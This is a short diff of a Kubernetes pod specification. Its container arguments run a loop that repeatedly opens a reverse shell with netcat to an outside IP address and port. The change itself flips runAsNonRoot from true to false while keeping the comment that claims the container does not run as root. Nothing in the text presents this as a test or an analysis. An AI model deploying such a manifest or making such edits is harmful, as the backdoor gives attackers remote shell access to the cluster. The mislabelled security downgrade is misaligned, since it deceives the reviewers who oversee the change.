@@ -13,7 +13,7 @@ spec:
     args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
     securityContext:
       allowPrivilegeEscalation: false  # Required by PodSecurity policy
-      runAsNonRoot: true  # Ensure the container doesn't run as root
+      runAsNonRoot: false  # Ensure the container doesn't run as root
       capabilities:
         drop: ["ALL"]  # Drop all unnecessary capabilities
       seccompProfile:
